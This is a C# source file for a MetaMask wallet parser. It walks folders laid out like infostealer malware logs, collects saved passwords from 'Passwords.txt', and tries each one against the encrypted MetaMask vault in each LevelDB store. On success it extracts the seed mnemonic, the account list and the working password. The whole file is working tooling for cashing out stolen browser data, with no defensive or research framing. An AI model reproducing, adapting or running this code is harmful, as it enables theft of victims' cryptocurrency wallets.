using System.Text;
using Core.Wallets.Crypting;
using LevelDB;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;

namespace Core.Wallets;

public enum WalletType
{
    Metamask
}

public class MetamaskParser
{
    public IEnumerable<MetamaskWallet?> ByLogs(string logs) => Directory.GetDirectories(logs).SelectMany(ByLog);

    public IEnumerable<MetamaskWallet?> ByLog(string log)
    {
        var passwords = new List<string>();
        var passwordsPath = Path.Combine(log, "Passwords.txt");
        var walletsPath = Path.Combine(log, "Wallets");
        
        if (!File.Exists(passwordsPath) || !Directory.Exists(walletsPath)) yield break;

        using var reader = new StreamReader(passwordsPath);

        while (!reader.EndOfStream)
        {
            var line = reader.ReadLine() ?? "";
            
            if (!line.StartsWith("Password")) continue;
            
            passwords.Add(line["Password: ".Length..line.Length]);
        }
        
        foreach (var wallet in Directory.GetDirectories(walletsPath))
        {
            yield return ByWallet(wallet, passwords);
        }
    }

    public MetamaskWallet? ByWallet(string dir, IEnumerable<string> passwords)
    {
        // get vault
        using var options = new Options
        {
            CreateIfMissing = false,
            ParanoidChecks = false
        };

        JObject json;
        
        try
        {
            using var db = new DB(options, dir);

            json = JsonConvert.DeserializeObject<JObject>(db.Get("data"))!;
        }
        catch
        {
            return null;
        }
        
        if (ParseVault(json) is not {} vault) return null;
        
        string? decrypted = null, password = null;

        // get mnemonic
        foreach (var pass in passwords)
        {
            decrypted = AesGcmCryptor.DecryptVault(pass, vault);

            if (decrypted is not null)
            {
                password = pass;
                
                break;
            }
        }

        if (decrypted is null) return null;
        
        return new MetamaskWallet
        {
            Mnemonic = GetMnemonic(decrypted),
            Type = WalletType.Metamask,
            Accounts = ParseAccounts(json),
            Password = password
        };
    }

    #region Db parsers

    private static Dictionary<string, MetamaskAccount> ParseAccounts(JObject json) =>
        JsonConvert.DeserializeObject<Dictionary<string, MetamaskAccount>>(json["PreferencesController"]?["identities"]?.ToString() ?? "") ?? new ();
    
    private static Vault? ParseVault(JObject json) => JsonConvert.DeserializeObject<Vault>(json["KeyringController"]?["vault"]?.ToString() ?? "");

    #endregion
    
    private static string GetMnemonic(string decrypted)
    {
        var json = JsonConvert.DeserializeObject<dynamic>(decrypted);

        try
        {
            var bytes = JArray.Parse((string)json![0].data.mnemonic.ToString()).ToObject<byte[]>()!;
            
            return Encoding.UTF8.GetString(bytes);
        }
        catch
        {
            return (string) json![0].data.mnemonic;
        }
    }
}

public class Vault
{
    [JsonProperty("data")] public string Data { get; set; } = "";
    [JsonProperty("iv")] public string Iv { get; set; } = "";
    [JsonProperty("salt")] public string Salt { get; set; } = "";
}